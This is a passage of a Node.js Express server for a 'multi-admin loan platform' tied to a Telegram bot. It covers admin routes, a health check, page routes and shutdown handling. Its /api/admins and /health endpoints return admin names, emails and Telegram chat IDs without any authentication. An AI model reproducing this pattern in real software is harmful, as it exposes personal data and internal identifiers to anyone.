app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins.map(admin => ({
            id: admin.adminId,
            name: admin.name,
            email: admin.email,
            status: admin.status,
            connected: adminChatIds.has(admin.adminId)
        }));
        
        res.json({ success: true, admins: adminList });
    } catch (error) {
        console.error('Error getting admins:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        
        if (admin && admin.status === 'active') {
            res.json({ 
                success: true, 
                valid: true,
                connected: adminChatIds.has(admin.adminId),
                admin: {
                    id: admin.adminId,
                    name: admin.name,
                    email: admin.email
                }
            });
        } else {
            res.json({ 
                success: true, 
                valid: false,
                message: 'Admin not found or inactive'
            });
        }
    } catch (error) {
        console.error('Error validating admin:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        adminsInMap: Array.from(adminChatIds.entries()).map(([id, chatId]) => ({ id, chatId })),
        botMode: 'webhook',
        webhookUrl: `${WEBHOOK_URL}/telegram-webhook`,
        timestamp: new Date().toISOString()
    });
});

app.get('/admin-select', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

app.get('/approval.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'approval.html'));
});

app.get('/', async (req, res) => {
    const adminId = req.query.admin;
    
    if (adminId) {
        console.log(`🔗 Admin link accessed: ${adminId}`);
        
        try {
            const admin = await db.getAdmin(adminId);
            
            if (admin && admin.status === 'active') {
                console.log(`✅ Valid admin: ${admin.name}`);
                
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                    console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
                }
                
                if (adminChatIds.has(adminId)) {
                    console.log(`✅ Admin ${adminId} is CONNECTED`);
                } else {
                    console.log(`⚠️ Admin ${adminId} NOT CONNECTED - needs to /start the bot`);
                }
            } else {
                console.log(`⚠️ Admin ${adminId} not found or inactive`);
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }
    
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// SERVER
// ==========================================

app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Admins in map: ${adminChatIds.size}`);
    console.log(`\n✅ Ready!\n`);
});

// Graceful shutdown only on actual termination signals
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down gracefully...`);
    try {
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup completed');
        process.exit(0);
    } catch (error) {
        console.error('❌ Error during shutdown:', error);
        process.exit(1);
    }
}

// Only shutdown on these signals
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));

// Log errors but DO NOT exit - stay alive!
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection (non-fatal):', error?.message);
    console.error('Stack:', error?.stack);
    // DO NOT EXIT - just log it
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception (non-fatal):', error?.message);
    console.error('Stack:', error?.stack);
    // DO NOT EXIT - just log it
});